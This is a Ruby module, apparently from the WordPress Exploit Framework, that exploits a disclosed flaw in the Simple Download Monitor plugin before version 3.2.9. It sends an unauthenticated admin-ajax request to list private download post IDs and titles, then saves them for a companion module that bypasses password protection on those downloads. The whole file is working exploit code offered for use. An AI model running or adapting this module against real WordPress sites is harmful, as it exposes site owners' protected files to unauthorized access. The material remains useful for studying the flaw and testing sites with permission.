class Wpxf::Auxiliary::SimpleDownloadMonitorFileDisclosure < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Simple Download Monitor File Disclosure',
      desc: 'This module uses a lack of session validation to get a list '\
            'of post IDs and their titles to be used with the '\
            'auxiliary/simple_download_monitor_file_download module in order '\
            'to bypass the password protection on private downloads.',
      author: [
        'James Golovich',                  # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8364'],
        ['URL', 'http://www.pritect.net/blog/simple-download-monitor-3-2-8-security-vulnerability']
      ],
      date: 'Jan 19 2016'
    )

    register_options([
      Wpxf::Options::StringOption.new(
        name: 'export_path',
        desc: 'The file to save the results to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('simple-download-monitor', '3.2.9')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def run
    return false unless super

    downloads = [{
      post_id: 'Post ID', title: 'Title'
    }]

    emit_info 'Requesting list of downloads...'
    res = execute_get_request(
      url: wordpress_url_admin_ajax,
      params: {
        'action' => 'sdm_tiny_get_post_ids'
      }
    )

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_info 'Parsing response...'
    json = nil
    begin
      json = JSON.parse(res.body)
      json['test'].each do |post|
        downloads.push(post_id: post['post_id'], title: post['post_title'])
      end
    rescue JSON::ParserError
      emit_error 'Could not parse the response'
      return false
    end

    emit_table downloads

    if export_path
      emit_info 'Saving results...'
      File.open(export_path, 'w') do |file|
        json['test'].each do |post|
          file.puts "#{post['post_id']},#{post['post_title']}"
        end
      end
      emit_success "Saved results to #{export_path}"
    end

    true
  end
end
